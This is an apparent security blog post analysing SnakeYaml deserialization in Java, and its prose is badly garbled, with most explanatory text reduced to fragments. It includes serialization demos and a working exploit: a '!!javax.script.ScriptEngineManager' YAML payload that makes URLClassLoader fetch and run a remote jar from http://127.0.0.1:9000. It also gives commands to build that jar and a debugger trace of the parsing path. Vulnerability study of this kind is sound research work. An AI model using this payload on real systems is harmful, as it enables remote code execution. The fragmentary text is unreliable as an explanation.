SnakeYaml 
SnakeYaml
SnakeYaml
SnakeYaml
SnakeYaml
SPI
ScriptEngineManager
C3P0
ScriptEngineManager
Reference
SnakeYaml 
snakeyamlyamlyamlxmlproperties
SpringyamlSnakeYamlYAML1.1
ProcessorUTF-8/UTF-16Java/YAML
yamlhttps://www.yiibai.com/yaml
Spring
ymlyamlpocyml
yamlhttps://www.345tool.com/zh-hans/formatter/yaml-formatter
SnakeYaml 
    org.yaml
    snakeyaml
    1.27
String dump(Object data)
JavaYAML
void 
dump(Object data, Writer output)
JavaYAML
String dumpAll(Iterator data)
JavaYAML
void 
dumpAll(Iterator data, Writer output)
JavaYAML
String dumpAs(Object data, Tag rootTag, DumperOptions.FlowStyle flowStyle)
JavaYAML
String dumpAsMap(Object data)
JavaYAML
 T 
load(InputStream io)
YAMLJava
 T 
load(Reader io)
YAMLJava
 T 
load(String yaml)
YAMLJava
Iterable 
loadAll(InputStream yaml)
YAMLJava
Iterable 
loadAll(Reader yaml)
YAMLJava
Iterable 
loadAll(String yaml)
YAMLJava
SnakeYamlYaml.dump()Yaml.load()yaml
Yaml.load()Java
Yaml.dump()yaml
User
public class User {
    public String name;
    public void setName(String name) {
        this.name = name;
    }
    public String getName() {
        return name;
    }
}
Demo
import 
Yaml;
public class SankeYamlDemo {
    public static void main(String[] args) {
        User user = new User();
        user.setName("xiaobei");
        Yaml yaml = new Yaml();
        String dump = yaml.dump(user);
        System.out.println(dump);
    }
}
org.yaml.snakeyaml.
!!com.zh1z3ven.SnakeYaml.User {name: xiaobei}
 !! fastjson @type 
User,print
public class User2 {
    String name;
    int age;
    public User2() {
        System.out.println("User");
    }
    public String getName() {
        System.out.println("User.getName");
        return name;
    }
    public void setName(String name) {
        System.out.println("User.setName");
        this.name = name;
    }
    public String getAge() {
        System.out.println("User.getAge");
        return name;
    }
    public void setAge(String name) {
        System.out.println("User.setAge");
        this.name = name;
    }
}
Demo !! 
import 
Yaml;
public class SankeYamlDemo {
    public static void main(String[] args) {
        Deserialize();
    }
    public static void Serialize(){
        User user = new User();
        user.setName("xiaobei");
        Yaml yaml = new Yaml();
        String dump = yaml.dump(user);
        System.out.println(dump);
    }
    public static void Deserialize(){
org.yaml.snakeyaml.
        String s = "!!com.zh1z3ven.SnakeYaml.User2 {name: xiaobei, age: 18}";
        Yaml yaml = new Yaml();
        User2 user2 = yaml.load(s);
    }
}
User
User.setName
User.setAge
set
SnakeYaml 
yaml !! +
 ScriptEngineManager payloadSPI URLClassLoader payload
JNDI
PoCjavax.script.ScriptEngineManagerURLClassLoader
githubweb
SnakeYaml
 Runtime.getRuntime().exec("open -a Calculator");
ClassLoaderdefineClass bytecodebase64
javac src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf yaml-payload.jar -C src/ .
web
poc
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://127.0.0.1:9000/yaml-payload.jar"]
  ]]
]
http log
yaml.load(s)
 StringReader PoCStreamReaderthis.stream
payload loadFromReader(new
StreamReader(yaml), Object.class) 
payloadComposer
 new ParserImpl 
 !! -> tag:yaml.org,2002:   payload
 BaseConstructor#setComposer()  Composer 
 BaseConstructor#getSingleData(type) 
this.composer.getSingleNode() payload !! tagxx
,yamlset maptag
 !!  tag Bypass
public static final String PREFIX = "tag:yaml.org,2002:";
public static final Tag YAML = new Tag("tag:yaml.org,2002:yaml");
public static final Tag MERGE = new Tag("tag:yaml.org,2002:merge");
public static final Tag SET = new Tag("tag:yaml.org,2002:set");
public static final Tag PAIRS = new Tag("tag:yaml.org,2002:pairs");
public static final Tag OMAP = new Tag("tag:yaml.org,2002:omap");
public static final Tag BINARY = new Tag("tag:yaml.org,2002:binary");
public static final Tag INT = new Tag("tag:yaml.org,2002:int");
public static final Tag FLOAT = new Tag("tag:yaml.org,2002:float");
public static final Tag TIMESTAMP = new Tag("tag:yaml.org,2002:timestamp");
public static final Tag BOOL = new Tag("tag:yaml.org,2002:bool");
public static final Tag NULL = new Tag("tag:yaml.org,2002:null");
public static final Tag STR = new Tag("tag:yaml.org,2002:str");
public static final Tag SEQ = new Tag("tag:yaml.org,2002:seq");
public static final Tag MAP = new Tag("tag:yaml.org,2002:map");
tagpayload ParserImpl#parseNode() 
parseNode:426, ParserImpl (org.yaml.snakeyaml.parser)
access$1300:117, ParserImpl (org.yaml.snakeyaml.parser)
produce:359, ParserImpl$ParseBlockNode (org.yaml.snakeyaml.parser)
peekEvent:158, ParserImpl (org.yaml.snakeyaml.parser)
checkEvent:148, ParserImpl (org.yaml.snakeyaml.parser)
composeNode:136, Composer (org.yaml.snakeyaml.composer)
getNode:95, Composer (org.yaml.snakeyaml.composer)
getSingleNode:119, Composer (org.yaml.snakeyaml.composer)
getSingleData:150, BaseConstructor (org.yaml.snakeyaml.constructor)
loadFromReader:490, Yaml (org.yaml.snakeyaml)
load:416, Yaml (org.yaml.snakeyaml)
payload
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://127.0.0.1:9000/yaml-payload.jar"]
  ]]
]
])>])>])>])>
  return this.constructDocument(node) 
 BaseConstructor#constructDocument  constructObject 
 constructObjectNoCheck tagvalue
 getConstructor nodepayload
 Constructor#construct 
 getConstuctor 